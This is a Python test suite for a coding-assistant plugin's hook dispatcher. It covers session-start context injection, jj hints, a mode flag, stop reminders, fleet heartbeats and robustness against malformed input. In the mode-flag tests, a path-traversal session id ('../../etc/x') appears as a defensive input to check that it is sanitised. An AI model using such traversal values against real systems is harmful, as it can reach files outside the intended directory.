"""Tests for hooks/tstack-hook, the plugin's one hook dispatcher, and hooks/hooks.json.

Run: just test-scripts  (or python3 -m unittest discover -s scripts/tests)

The rule under test above all: a hook never breaks a session. Whatever goes
wrong, the dispatcher exits 0 with nothing on stdout and logs to hook.log.
"""

import json
import os
import re
import shlex
import shutil
import statistics
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
HOOK = ROOT / "hooks" / "tstack-hook"
HOOKS_JSON = ROOT / "hooks" / "hooks.json"
MEMO = ROOT / "scripts" / "memo"
TUCA = ROOT / "bin" / "tuca-mode"
HEARTBEAT_ONLY = ("PostToolUseFailure", "SubagentStart", "SubagentStop")


def tool_use(name, **tool_input):
    return {"type": "assistant", "message": {"role": "assistant", "content": [
        {"type": "tool_use", "id": f"toolu_{name}", "name": name, "input": tool_input}]}}


def said(text):
    return {"type": "user", "message": {"role": "user", "content": text}}


class HookCase(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.tmp = Path(self._tmp.name).resolve()
        self.addCleanup(self._tmp.cleanup)
        self.data = self.tmp / "plugin-data"
        self.env = {
            "HOME": str(self.tmp / "home"),
            "PATH": os.environ.get("PATH", ""),
            "XDG_DATA_HOME": str(self.tmp / "data"),
            "XDG_CACHE_HOME": str(self.tmp / "cache"),
            "CLAUDE_PLUGIN_ROOT": str(ROOT),
            "CLAUDE_PLUGIN_DATA": str(self.data),
        }
        self.repo = self.tmp / "repo"
        self.repo.mkdir()
        subprocess.run(["git", "init", "-q"], cwd=self.repo, check=True)
        subprocess.run(["git", "remote", "add", "origin", "git@github.com:acme/hooked.git"], cwd=self.repo, check=True)
        self.transcript = self.tmp / "transcript.jsonl"
        self.transcript.write_text("")

    def hook(self, event, payload=None, raw=None, env=None):
        stdin = raw if raw is not None else json.dumps(payload or {})
        return subprocess.run([str(HOOK), event], input=stdin, capture_output=True, text=True,
                              env={**self.env, **(env or {})}, timeout=30)

    def base(self, event, **extra):
        return {"session_id": "sess-1", "transcript_path": str(self.transcript), "cwd": str(self.repo),
                "hook_event_name": event, **extra}

    def transcribe(self, *entries):
        with open(self.transcript, "a") as f:
            for e in entries:
                f.write(json.dumps(e, separators=(",", ":")) + "\n")

    def memo(self, *args):
        return subprocess.run([sys.executable, str(MEMO), *args], cwd=self.repo, env={**os.environ, **self.env},
                              capture_output=True, text=True, check=True).stdout

    def log(self):
        path = self.data / "hook.log"
        return path.read_text() if path.exists() else ""

    def assertSilent(self, result):
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout, "")


class SessionStartTest(HookCase):
    def test_injects_the_wake_as_additional_context(self):
        self.memo("note", "decision", "hooks are one Python dispatcher")
        for source in ("startup", "resume", "clear", "compact"):
            r = self.hook("SessionStart", self.base("SessionStart", source=source))
            self.assertEqual(r.returncode, 0, r.stderr)
            out = json.loads(r.stdout)
            self.assertEqual(set(out), {"hookSpecificOutput"})
            self.assertEqual(out["hookSpecificOutput"]["hookEventName"], "SessionStart")
            context = out["hookSpecificOutput"]["additionalContext"]
            self.assertTrue(context.startswith("# memo"))
            self.assertIn("project:acme/hooked", context)
            self.assertIn("hooks are one Python dispatcher", context)
            self.assertEqual("just compacted" in context, source == "compact")

    def test_a_worker_gets_no_wake(self):
        self.memo("note", "fact", "something")
        self.assertSilent(self.hook("SessionStart", self.base("SessionStart", source="startup", agent_id="a1")))
        self.assertSilent(self.hook("SessionStart", self.base("SessionStart", source="startup"),
                                    env={"TSTACK_ROLE": "worker"}))

    def test_cwd_falls_back_to_the_project_dir(self):
        self.memo("note", "fact", "found through CLAUDE_PROJECT_DIR")
        payload = self.base("SessionStart", source="startup")
        del payload["cwd"]
        r = self.hook("SessionStart", payload, env={"CLAUDE_PROJECT_DIR": str(self.repo)})
        self.assertIn("found through CLAUDE_PROJECT_DIR", r.stdout)


@unittest.skipUnless(shutil.which("jj"), "jj is not installed")
class JJHintsTest(HookCase):
    def setUp(self):
        super().setUp()
        self.env["MEMO_QUIET"] = "1"
        self.jjrepo = self.tmp / "jjrepo"
        self.jjrepo.mkdir()
        subprocess.run(["jj", "git", "init", "--colocate"], cwd=self.jjrepo, check=True, capture_output=True)

    def context(self, cwd, **extra):
        r = self.hook("SessionStart", {**self.base("SessionStart", source="startup"), "cwd": str(cwd), **extra})
        self.assertEqual(r.returncode, 0, r.stderr)
        return json.loads(r.stdout)["hookSpecificOutput"]["additionalContext"] if r.stdout else ""

    def hints(self, context):
        return context[context.index("# jj"):] if "# jj" in context else ""

    def test_a_jj_repo_gets_the_hints_from_any_subfolder(self):
        (self.jjrepo / "src" / "deep").mkdir(parents=True)
        for cwd in (self.jjrepo, self.jjrepo / "src" / "deep"):
            hints = self.hints(self.context(cwd))
            self.assertTrue(hints.startswith("# jj\n"))
            self.assertIn("detached git HEAD is normal", hints)
            self.assertIn("jj git push --bookmark <b>", hints)
            self.assertIn("jj rebase -b @ -d <b>@origin", hints)
            self.assertIn("land-check -b <b>", hints)
            self.assertIn("/tstack:worktree-janitor", hints)
            self.assertNotIn("secondary workspace;", hints)
            self.assertLessEqual(len(hints.splitlines()), 10)

    def test_a_secondary_workspace_names_the_main_one(self):
        second = self.tmp / "jjrepo-lane"
        subprocess.run(["jj", "workspace", "add", str(second), "--name", "lane"], cwd=self.jjrepo,
                       check=True, capture_output=True)
        self.assertTrue((second / ".jj" / "repo").is_file())
        hints = self.hints(self.context(second))
        self.assertIn(f"the main one is {self.jjrepo}", hints)

    def test_silent_outside_jj(self):
        self.assertEqual(self.hints(self.context(self.repo)), "")  # plain git
        plain = self.tmp / "plain"
        plain.mkdir()
        self.assertEqual(self.hints(self.context(plain)), "")
        half = self.tmp / "half"
        (half / ".jj").mkdir(parents=True)
        self.assertEqual(self.hints(self.context(half)), "")

    def test_workers_get_the_hints_and_memo_stays_first(self):
        self.assertIn("# jj", self.context(self.jjrepo, agent_id="w1"))
        self.env["MEMO_QUIET"] = ""
        context = self.context(self.jjrepo)
        self.assertTrue(context.startswith("# memo"), context[:80])
        self.assertIn("\n\n# jj\n", context)

    def test_the_hint_is_fast(self):
        (self.jjrepo / "a" / "b" / "c").mkdir(parents=True)
        payload = {**self.base("SessionStart", source="startup"), "cwd": str(self.jjrepo / "a" / "b" / "c")}
        self.hook("SessionStart", payload)
        times = []
        for _ in range(7):
            started = time.perf_counter()
            self.hook("SessionStart", payload)
            times.append((time.perf_counter() - started) * 1000)
        print(f"\n  SessionStart (jj hints) hook: median {statistics.median(times):.0f} ms, best {min(times):.0f} ms",
              end="", file=sys.stderr)
        self.assertLess(min(times), 150, times)


class TucaModeTest(HookCase):
    """The flag scripts/tuca-mode writes, and the SessionStart handler that re-injects the mode."""

    def flag(self, *args, env=None):
        r = subprocess.run([str(TUCA), *args], capture_output=True, text=True, env={**self.env, **(env or {})},
                           timeout=30)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(r.stderr, "")
        return r.stdout.strip()

    def context(self, source, **extra):
        r = self.hook("SessionStart", self.base("SessionStart", source=source, **extra))
        self.assertEqual(r.returncode, 0, r.stderr)
        return json.loads(r.stdout)["hookSpecificOutput"]["additionalContext"] if r.stdout else ""

    def block(self, source, **extra):
        context = self.context(source, **extra)
        return context[context.index("# tuca-mode"):] if "# tuca-mode" in context else ""

    def test_on_status_off_round_trip(self):
        flag = self.data / "sessions" / "sess-1" / "tuca-mode"
        self.assertEqual(self.flag("status", "sess-1"), "tuca-mode: off for session sess-1")
        self.assertIn(f"(flag {flag})", self.flag("on", "sess-1"))
        self.assertTrue(flag.is_file())
        self.assertIn("(flag", self.flag("on", "sess-1"))  # idempotent
        self.assertEqual(self.flag("status", "sess-1"), "tuca-mode: on for session sess-1")
        self.assertEqual(self.flag("off", "sess-1"), "tuca-mode: off for session sess-1")
        self.assertFalse(flag.exists())
        self.assertEqual(self.flag("off", "sess-1"), "tuca-mode: already off for session sess-1")

    def test_data_flag_wins_over_the_environment(self):
        # The skill's `!` line runs without CLAUDE_PLUGIN_DATA in its environment, so it passes --data.
        other = self.tmp / "given"
        self.flag("on", "sess-1", "--data", str(other))
        self.assertTrue((other / "sessions" / "sess-1" / "tuca-mode").is_file())
        self.assertFalse((self.data / "sessions" / "sess-1").exists())
        env = {k: v for k, v in self.env.items() if k != "CLAUDE_PLUGIN_DATA"}
        r = subprocess.run([str(TUCA), "on", "sess-9"], capture_output=True, text=True,
                           env={**env, "XDG_STATE_HOME": str(self.tmp / "state")})
        self.assertIn(str(self.tmp / "state" / "tstack" / "sessions" / "sess-9"), r.stdout)

    def test_never_fails(self):
        blocker = self.tmp / "blocker"
        blocker.write_text("a file, not a folder")
        self.assertIn("the flag was not written", self.flag("on", "sess-1", "--data", str(blocker)))
        self.assertIn("no session id", self.flag("on", "${CLAUDE_SESSION_ID}"))
        self.assertTrue(self.flag().startswith("usage:"))
        self.assertTrue(self.flag("jump", "sess-1").startswith("usage:"))
        self.assertIn("tuca-mode:", self.flag("on", "../../etc/x"))
        self.assertTrue((self.data / "sessions" / ".._.._etc_x" / "tuca-mode").is_file())

    def test_reinjected_after_compact_and_resume_only_with_the_flag(self):
        for source in ("startup", "resume", "clear", "compact"):
            self.assertEqual(self.block(source), "", source)
        self.flag("on", "sess-1")
        for source in ("compact", "resume"):
            block = self.block(source)
            self.assertTrue(block.startswith("# tuca-mode is on\n"), block[:60])
            self.assertLessEqual(len(block.splitlines()), 15)
            self.assertIn(str(ROOT / "skills" / "engineering" / "tuca-mode" / "SKILL.md"), block)
            self.assertIn("copied verbatim", block)
            self.assertIn("only when `land-check` says it will not deploy", block)
            self.assertIn(f"{ROOT / 'bin' / 'tuca-mode'} off sess-1 --data {self.data}", block)
        for source in ("startup", "clear"):
            self.assertEqual(self.block(source), "", source)
        self.assertEqual(self.block("compact", session_id="sess-2"), "")
        self.flag("off", "sess-1")
        self.assertEqual(self.block("compact"), "")

    def test_workers_never_get_it(self):
        self.flag("on", "sess-1")
        self.assertEqual(self.block("compact", agent_id="w1"), "")
        self.assertSilent(self.hook("SessionStart", self.base("SessionStart", source="compact"),
                                    env={"TSTACK_ROLE": "worker"}))

    def test_it_follows_memo_and_jj(self):
        self.memo("note", "fact", "tuca order")
        self.flag("on", "sess-1")
        context = self.context("compact")
        self.assertTrue(context.startswith("# memo"))
        self.assertTrue(context.rstrip().split("\n\n")[-1].startswith("# tuca-mode is on"))

    def test_the_reinjection_is_fast(self):
        self.flag("on", "sess-1")
        payload = self.base("SessionStart", source="compact")
        self.hook("SessionStart", payload)
        times = []
        for _ in range(7):
            started = time.perf_counter()
            self.hook("SessionStart", payload)
            times.append((time.perf_counter() - started) * 1000)
        print(f"\n  SessionStart (tuca-mode) hook: median {statistics.median(times):.0f} ms, best {min(times):.0f} ms",
              end="", file=sys.stderr)
        self.assertLess(min(times), 150, times)


class StopTest(HookCase):
    def stop(self, env=None, **extra):
        return self.hook("Stop", self.base("Stop", stop_hook_active=False, **extra), env=env)

    def context(self, result):
        self.assertEqual(result.returncode, 0, result.stderr)
        out = json.loads(result.stdout)
        self.assertEqual(out["hookSpecificOutput"]["hookEventName"], "Stop")
        return out["hookSpecificOutput"]["additionalContext"]

    def test_real_work_without_a_note_is_reminded_once(self):
        self.transcribe(said("fix it"), tool_use("Read", file_path="a"), tool_use("Edit", file_path="a"))
        self.assertIn("memo note", self.context(self.stop()))
        self.transcribe(tool_use("Write", file_path="b"))
        self.assertSilent(self.stop())
        state = json.loads((self.data / "sessions" / "sess-1.memo.json").read_text())
        self.assertTrue(state["reminded"])

    def test_sessions_are_tracked_apart(self):
        self.transcribe(tool_use("MultiEdit", file_path="a"))
        self.context(self.stop())
        self.context(self.hook("Stop", {**self.base("Stop"), "session_id": "sess-2"}))

    def test_reading_is_not_work_and_the_scan_is_incremental(self):
        self.transcribe(tool_use("Read", file_path="a"), tool_use("Bash", command="jj log -r @"))
        self.assertSilent(self.stop())
        self.transcribe(tool_use("Bash", command="jj --no-pager describe -m 'feat: x'"))
        self.assertIn("memo note", self.context(self.stop()))

    def test_a_commit_counts_and_a_note_satisfies(self):
        for command in ("jj commit -m x", "git commit -qm x", "jj desc -r @- -m y"):
            self.transcript.write_text("")
            shutil.rmtree(self.data, ignore_errors=True)
            self.transcribe(tool_use("Bash", command=command))
            self.assertIn("memo note", self.context(self.stop()), command)
        self.transcript.write_text("")
        shutil.rmtree(self.data, ignore_errors=True)
        self.transcribe(tool_use("Edit", file_path="a"),
                        tool_use("Bash", command='/x/scripts/memo note gotcha "the index is a cache"'))
        self.assertSilent(self.stop())
        self.transcribe(tool_use("Edit", file_path="b"))
        self.assertSilent(self.stop())

    def test_quoted_tool_names_in_text_are_not_work(self):
        self.transcribe(said('the transcript says "name":"Edit" and tool_use'))
        self.assertSilent(self.stop())

    def test_skipped_for_workers_quiet_and_an_active_stop_hook(self):
        self.transcribe(tool_use("Edit", file_path="a"))
        self.assertSilent(self.stop(agent_id="worker-1"))
        self.assertSilent(self.hook("Stop", self.base("Stop"), env={"TSTACK_ROLE": "worker"}))
        self.assertSilent(self.hook("Stop", self.base("Stop"), env={"MEMO_QUIET": "1"}))
        self.assertSilent(self.hook("Stop", self.base("Stop", stop_hook_active=True)))
        self.assertSilent(self.hook("Stop", self.base("Stop"), env={"CLAUDE_CODE_SESSION_ATTENDED": "0"}))
        self.assertSilent(self.hook("Stop", self.base("Stop"), env={"CLAUDE_CODE_ENTRYPOINT": "sdk-cli"}))
        self.context(self.stop(env={"CLAUDE_CODE_SESSION_ATTENDED": "1", "CLAUDE_CODE_ENTRYPOINT": "cli"}))

    def test_a_half_written_last_line_waits_for_the_next_run(self):
        self.transcribe(tool_use("Read", file_path="a"))
        line = json.dumps(tool_use("Edit", file_path="a"), separators=(",", ":"))
        with open(self.transcript, "a") as f:
            f.write(line[:30])
        self.assertSilent(self.stop())
        with open(self.transcript, "a") as f:
            f.write(line[30:] + "\n")
        self.context(self.stop())


class PreCompactTest(HookCase):
    def test_prints_compaction_instructions_as_plain_text(self):
        r = self.hook("PreCompact", self.base("PreCompact", trigger="auto", custom_instructions=None))
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("Memo candidates", r.stdout)
        with self.assertRaises(ValueError):
            json.loads(r.stdout)
        self.assertSilent(self.hook("PreCompact", self.base("PreCompact", trigger="manual", agent_id="w")))


class NeverBreakTest(HookCase):
    """Whatever the input or the state of the machine: exit 0, nothing on stdout."""

    def test_bad_input(self):
        for raw in ("not json", "[1, 2]", "null", '{"session_id": ', "\x00\xff", '{"cwd": 7, "source": []}'):
            for event in ("SessionStart", "Stop", "PreCompact"):
                r = self.hook(event, raw=raw)
                self.assertEqual(r.returncode, 0, (event, raw, r.stderr))
                if not raw.startswith('{"cwd"'):  # an object of odd values is still answered
                    self.assertEqual(r.stdout, "", (event, raw))
        self.assertIn("dispatcher failed", self.log())

    def test_unknown_or_missing_event(self):
        self.assertSilent(self.hook("NoSuchEvent", self.base("NoSuchEvent")))
        r = subprocess.run([str(HOOK)], input="{}", capture_output=True, text=True, env=self.env)
        self.assertSilent(r)

    def test_a_failing_handler_is_logged_and_silent(self):
        broken = self.tmp / "broken-plugin"
        (broken / "scripts").mkdir(parents=True)
        (broken / "scripts" / "memo").write_text("raise RuntimeError('memo exploded')\n")
        r = self.hook("SessionStart", self.base("SessionStart", source="startup"),
                      env={"CLAUDE_PLUGIN_ROOT": str(broken)})
        self.assertSilent(r)
        self.assertIn("memo exploded", self.log())
        self.assertIn("SessionStart memo_wake failed", self.log())

    def test_a_missing_memo_script_is_silent(self):
        r = self.hook("SessionStart", self.base("SessionStart", source="startup"),
                      env={"CLAUDE_PLUGIN_ROOT": str(self.tmp / "nowhere")})
        self.assertSilent(r)

    def test_odd_transcripts(self):
        folder = self.tmp / "a-folder"
        folder.mkdir()
        garbage = self.tmp / "garbage.jsonl"
        garbage.write_bytes(os.urandom(4096) + b'\n{"type":"tool_use" broken\n' + b'"tool_use"\n[1]\n')
        for path in (str(folder), str(garbage), str(self.tmp / "missing.jsonl"), 42, None, ["x"]):
            r = self.hook("Stop", {**self.base("Stop"), "transcript_path": path})
            self.assertSilent(r)

    def test_an_unwritable_plugin_data_dir(self):
        blocker = self.tmp / "blocker"
        blocker.write_text("a file, not a folder")
        self.transcribe(tool_use("Edit", file_path="a"))
        r = self.hook("Stop", self.base("Stop"), env={"CLAUDE_PLUGIN_DATA": str(blocker / "sub")})
        self.assertSilent(r)

    def test_a_broken_memory_store_still_wakes_or_stays_silent(self):
        notes = self.repo / ".tstack" / "memo" / "notes"
        notes.mkdir(parents=True)
        (notes / "01ARZ3NDEKTSV4RRFFQ69G5FAV.md").write_text("+++\nnot toml at all ===\n+++\ntext\n")
        (self.repo / ".tstack" / "memo" / "config.toml").write_text("project_lines = [broken")
        r = self.hook("SessionStart", self.base("SessionStart", source="startup"))
        self.assertEqual(r.returncode, 0)
        self.assertIn("# memo", json.loads(r.stdout)["hookSpecificOutput"]["additionalContext"])

    def test_headless_sessions_still_wake(self):
        r = self.hook("SessionStart", self.base("SessionStart", source="startup"),
                      env={"CLAUDE_CODE_SESSION_ATTENDED": "0", "CLAUDE_CODE_ENTRYPOINT": "sdk-cli"})
        self.assertIn("# memo", json.loads(r.stdout)["hookSpecificOutput"]["additionalContext"])


def load_hook():
    """hooks/tstack-hook as a module, to time a handler without the interpreter's start-up."""
    from importlib.machinery import SourceFileLoader
    from importlib.util import module_from_spec, spec_from_loader
    loader = SourceFileLoader("tstack_hook_under_test", str(HOOK))
    module = module_from_spec(spec_from_loader("tstack_hook_under_test", loader))
    loader.exec_module(module)
    return module


class HeartbeatTest(HookCase):
    """fleet_heartbeat: one file per session (and subagent) in DIR/heartbeats/, inside a fleet only."""

    def setUp(self):
        super().setUp()
        self.env["MEMO_QUIET"] = "1"
        self.pad = self.tmp / "scratchpad"
        self.fleet = self.pad / "coordinator"
        self.fleet.mkdir(parents=True)
        # paused: the Stop guard (StopGuardTest) leaves it alone, so a stop here only beats
        (self.fleet / "state.json").write_text('{"project": "p", "status": "paused"}')
        (self.pad / "notes").mkdir()  # a folder without a ledger is no fleet

    def tool(self, event="PostToolUse", **extra):
        return {**self.base(event), "scratchpad_dir": str(self.pad), "tool_name": "Edit",
                "tool_input": {"file_path": str(self.repo / "a.py")}, "tool_use_id": "toolu_1", **extra}

    def beats(self, fleet=None):
        folder = (fleet or self.fleet) / "heartbeats"
        return {p.name: json.loads(p.read_text()) for p in sorted(folder.glob("*.json"))} if folder.is_dir() else {}

    def test_a_tool_call_in_a_fleet_writes_the_sessions_heartbeat(self):
        r = self.hook("PostToolUse", self.tool(), env={"FLEET_NOW": "2026-01-05T09:00:00+00:00", "TZ": "UTC"})
        self.assertSilent(r)
        beat = self.beats()["sess-1.json"]
        self.assertEqual(beat, {
            "session": "sess-1", "agent": None, "agent_type": None, "worker": None, "cwd": str(self.repo),
            "workspace": None, "path": str(self.repo / "a.py"), "tool": "Edit", "event": "PostToolUse",
            "at": "2026-01-05T09:00:00+00:00", "transcript": str(self.transcript), "agent_transcript": None})
        self.assertEqual([p.name for p in (self.fleet / "heartbeats").iterdir()], ["sess-1.json"])  # no tmp left
        self.assertFalse((self.pad / "notes" / "heartbeats").exists())

    def test_the_next_call_replaces_it_and_subagents_beat_apart(self):
        self.hook("PostToolUse", self.tool(), env={"FLEET_NOW": "2026-01-05T09:00:00+00:00", "TZ": "UTC"})
        self.hook("PostToolUse", self.tool(tool_name="Bash", tool_input={"command": "ls"}),
                  env={"FLEET_NOW": "2026-01-05T09:07:00+00:00", "TZ": "UTC"})
        self.hook("PostToolUse", self.tool(agent_id="ab12", agent_type="general-purpose"), env={"TZ": "UTC"})
        self.hook("SubagentStop", {**self.tool("SubagentStop", agent_id="cd34", agent_transcript_path="/t/agent-cd34.jsonl")})
        beats = self.beats()
        self.assertEqual(sorted(beats), ["sess-1.ab12.json", "sess-1.cd34.json", "sess-1.json"])
        self.assertEqual((beats["sess-1.json"]["tool"], beats["sess-1.json"]["at"], beats["sess-1.json"]["path"]),
                         ("Bash", "2026-01-05T09:07:00+00:00", None))
        self.assertEqual((beats["sess-1.ab12.json"]["agent"], beats["sess-1.ab12.json"]["agent_type"]), ("ab12", "general-purpose"))
        self.assertEqual((beats["sess-1.cd34.json"]["event"], beats["sess-1.cd34.json"]["agent_transcript"]),
                         ("SubagentStop", "/t/agent-cd34.jsonl"))

    def test_session_start_and_stop_beat_and_say_only_what_they_said(self):
        r = self.hook("SessionStart", {**self.base("SessionStart", source="startup"), "scratchpad_dir": str(self.pad)})
        self.assertEqual(r.returncode, 0)
        self.assertNotIn("heartbeat", r.stdout)
        self.assertEqual(self.beats()["sess-1.json"]["event"], "SessionStart")
        self.hook("PostToolUse", self.tool(tool_name="Grep"))
        self.assertSilent(self.hook("Stop", {**self.base("Stop"), "scratchpad_dir": str(self.pad)}))
        self.assertEqual((self.beats()["sess-1.json"]["event"], self.beats()["sess-1.json"]["tool"]), ("Stop", "Grep"))

    def test_the_project_dir_is_written_when_absolute(self):
        project = self.tmp / "project"
        self.hook("PostToolUse", self.tool(), env={"CLAUDE_PROJECT_DIR": str(project)})
        beat = self.beats()["sess-1.json"]
        self.assertEqual((beat["project"], beat["cwd"]), (str(project), str(self.repo)))
        for given in ("relative/project", ""):
            self.hook("PostToolUse", self.tool(), env={"CLAUDE_PROJECT_DIR": given})
            self.assertNotIn("project", self.beats()["sess-1.json"], given)
        self.hook("PostToolUse", self.tool())
        self.assertNotIn("project", self.beats()["sess-1.json"])

    def test_fleet_dir_and_fleet_worker_name_a_worker_launched_on_its_own(self):
        other = self.tmp / "elsewhere" / "fleet"
        other.mkdir(parents=True)
        (other / "state.json").write_text("{}")
        self.assertSilent(self.hook("PostToolUse", self.tool(), env={"FLEET_DIR": str(other), "FLEET_WORKER": "a1"}))
        self.assertEqual(self.beats(other)["sess-1.json"]["worker"], "a1")
        self.assertEqual(self.beats(), {})  # FLEET_DIR wins over the scratchpad

    def test_the_jj_workspace_is_named(self):
        main = self.tmp / "jjmain"
        main.mkdir()
        subprocess.run(["jj", "git", "init"], cwd=main, check=True, capture_output=True)
        lane = self.tmp / "jjmain-a1"
        subprocess.run(["jj", "workspace", "add", str(lane), "--name", "a1"], cwd=main, check=True, capture_output=True)
        (lane / "src").mkdir()
        self.hook("PostToolUse", self.tool(cwd=str(lane / "src")))
        self.assertEqual(self.beats()["sess-1.json"]["workspace"], "a1")
        self.hook("PostToolUse", self.tool(cwd=str(main)))
        self.assertEqual(self.beats()["sess-1.json"]["workspace"], "default")

    def test_a_no_op_outside_a_fleet(self):
        cases = [
            self.base("PostToolUse", tool_name="Edit"),  # no scratchpad named
            {**self.tool(), "scratchpad_dir": str(self.pad / "notes")},  # a scratchpad without a ledger
            {**self.tool(), "scratchpad_dir": "relative/path"},
        ]
        for payload in cases:
            self.assertSilent(self.hook("PostToolUse", payload))
        self.assertSilent(self.hook("PostToolUse", self.tool(), env={"FLEET_DIR": str(self.tmp / "no-ledger")}))
        self.assertEqual(self.beats(), {})
        self.assertEqual(list(self.tmp.rglob("heartbeats")), [])

    def test_never_raises(self):
        odd = [
            {**self.tool(), "agent_id": 7, "tool_input": ["x"], "tool_name": {"a": 1}},
            {**self.tool(), "session_id": ""},
            {**self.tool(), "scratchpad_dir": 42},
            {**self.tool(), "cwd": str(self.tmp / "gone")},
        ]
        for payload in odd:
            self.assertSilent(self.hook("PostToolUse", payload))
        shutil.rmtree(self.fleet / "heartbeats")  # the odd input above still beat
        (self.fleet / "heartbeats").write_text("a file where the folder goes")
        for event in ("PostToolUse", "PostToolUseFailure", "SubagentStart", "SubagentStop", "Stop"):
            self.assertSilent(self.hook(event, self.tool(event)))
        self.assertIn("PostToolUse fleet_heartbeat failed", self.log())
        broken = self.tmp / "broken-jj"
        (broken / ".jj" / "working_copy").mkdir(parents=True)
        (broken / ".jj" / "repo").mkdir()
        (broken / ".jj" / "working_copy" / "checkout").write_bytes(b"\x12\xff")  # truncated
        (self.fleet / "heartbeats").unlink()
        self.assertSilent(self.hook("PostToolUse", self.tool(cwd=str(broken))))
        self.assertIsNone(self.beats()["sess-1.json"]["workspace"])

    def test_the_handler_takes_a_few_milliseconds(self):
        module = load_hook()
        lane = self.tmp / "deep" / "a" / "b" / "c"
        lane.mkdir(parents=True)
        payload = self.tool(cwd=str(lane))
        times = []
        for _ in range(200):
            hook = module.Hook("PostToolUse", payload, self.env)
            started = time.perf_counter()
            module.fleet_heartbeat(hook)
            times.append((time.perf_counter() - started) * 1000)
        print(f"\n  heartbeat handler: median {statistics.median(times):.2f} ms, best {min(times):.2f} ms",
              end="", file=sys.stderr)
        self.assertLess(statistics.median(times), 3, times[:20])
        quiet = module.Hook("PostToolUse", self.base("PostToolUse"), self.env)
        started = time.perf_counter()
        for _ in range(200):
            module.fleet_heartbeat(quiet)
        self.assertLess((time.perf_counter() - started) * 1000 / 200, 0.5)  # outside a fleet: next to nothing


class FleetCase(HookCase):
    """A coordinator's fleet in its scratchpad, for the listening rules (the Stop guard, the nudge)."""

    def setUp(self):
        super().setUp()
        self.env["MEMO_QUIET"] = "1"
        self.pad = self.tmp / "scratchpad"
        self.fleet = self.pad / "coordinator"
        self.fleet.mkdir(parents=True)
        self.ledger()
        self.fleet_cli = f"{ROOT}/fleet/bin/fleet"
        self.registry = self.tmp / "registry"
        self.registry.mkdir()
        self.env["FLEET_HOME"] = str(self.registry)
        self.register(self.fleet)

    def register(self, fleet, session="sess-1", id="p"):
        """The hub's registry entry `fleet serve` writes for FLEET, served by SESSION."""
        (self.registry / f"{id}.json").write_text(json.dumps({
            "id": id, "role": "coordinator", "dir": str(fleet), "url": f"http://127.0.0.1:7420/f/{id}/",
            "pid": os.getpid(), "session": None, "session_id": session, "since": "2026-01-05T08:00:00+00:00"}))

    def ledger(self, **fields):
        state = {"project": "p", "goal": "g", "status": "running", "now": "n", "started": "2026-01-05T08:00:00+00:00",
                 "roadmap": [], "agents": [], "roadblocks": [], "decisions": [], "events": [], **fields}
        (self.fleet / "state.json").write_text(json.dumps(state))

    def say(self, id, at, text="hi", frm="user", to=("coordinator",), re=None, **extra):
        with open(self.fleet / "chat.jsonl", "a") as f:
            f.write(json.dumps({"id": id, "at": at, "from": frm, "to": list(to), "text": text, "re": re,
                                "parts": [{"text": text}], **extra}) + "\n")

    def payload(self, event, **extra):
        return {**self.base(event), "scratchpad_dir": str(self.pad), **extra}

    def watch(self, fleet=None, role="coordinator", pid_file=True, once=True):
        """A process whose command line is a chat watch's (`... chat DIR watch --as ROLE ... --once`)."""
        fleet = fleet or self.fleet
        proc = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)", "chat", str(fleet), "watch",
                                 "--as", role, "--all", "--resume", *(["--once"] if once else [])])
        self.addCleanup(lambda: (proc.kill(), proc.wait()))
        if pid_file:
            (self.fleet / f"watch-{role}.pid").write_text(str(proc.pid))
        return proc


class TapeRoleTest(FleetCase):
    """TSTACK_ROLE=tape, a tape builder's own `claude -p` call: every handler of every event stays silent and
    writes nothing (no wake in the compaction prompt, no heartbeat, no state, no spawn)."""

    def files(self):
        return sorted(str(p.relative_to(self.tmp)) for p in self.tmp.rglob("*") if p.is_file())

    def every_event(self, env):
        self.memo("note", "decision", "a wake would carry this")
        self.env.pop("MEMO_QUIET")
        self.transcribe(said("edit it"), tool_use("Edit", file_path=str(self.repo / "a.py")))
        before = self.files()
        results = {}
        for event in json.loads(HOOKS_JSON.read_text())["hooks"]:
            payload = self.payload(event, source="startup", stop_hook_active=False, tool_name="Agent",
                                   tool_input={"subagent_type": "general-purpose", "prompt": "p"},
                                   tool_use_id="toolu_1", agent_id="ab12" if event.startswith("Subagent") else None)
            results[event] = self.hook(event, payload, env=env)
        return before, results

    def test_every_handler_is_silent_and_writes_nothing(self):
        before, results = self.every_event({"TSTACK_ROLE": "tape"})
        for event, r in results.items():
            self.assertSilent(r)
        self.assertEqual(self.files(), before, "a tape call's hooks wrote a file")
        self.assertFalse((self.fleet / "heartbeats").exists())

    def test_the_same_events_speak_without_the_role(self):
        before, results = self.every_event({})
        self.assertIn("a wake would carry this", results["SessionStart"].stdout)
        self.assertTrue((self.fleet / "heartbeats").is_dir(), "the control run beats")
        self.assertNotEqual(self.files(), before)


class StopGuardTest(FleetCase):
    """fleet_listen_guard: a coordinator or manager does not end a turn with no chat watch."""

    def stop(self, env=None, **extra):
        return self.hook("Stop", self.payload("Stop", stop_hook_active=False, **extra), env=env)

    def blocked(self, result):
        self.assertEqual(result.returncode, 0, result.stderr)
        out = json.loads(result.stdout)
        self.assertEqual(out["decision"], "block")
        return out["reason"]

    def fresh(self):
        shutil.rmtree(self.data / "sessions", ignore_errors=True)  # forget the last block

    def test_blocks_with_no_watch_and_names_the_command(self):
        reason = self.blocked(self.stop())
        self.assertTrue(reason.startswith("Your chat watch isn't running, so the user's messages and answers go unheard."))
        self.assertIn("(`run_in_background: true`, `timeout: 3300000`)", reason)
        self.assertIn(f"`{self.fleet_cli} chat {self.fleet} watch --as coordinator --all --resume --once`", reason)
        self.assertNotIn("--fleets", reason)
        self.assertSilent(self.stop())  # never twice within a few seconds

    def test_the_manager_is_told_its_role_and_the_fleets_rule(self):
        self.ledger(role="manager")
        reason = self.blocked(self.stop())
        self.assertIn(f"chat {self.fleet} watch --as manager --all --resume --once`", reason)
        self.assertIn("add `--fleets`", reason)

    def test_passes_with_a_live_watch(self):
        self.watch()
        self.assertSilent(self.stop())

    def test_a_watch_not_yet_in_its_pid_file_counts(self):
        self.watch(pid_file=False)
        self.assertSilent(self.stop())

    def test_a_watch_without_once_does_not_count(self):
        self.watch(once=False)  # it never exits, so it never wakes the session
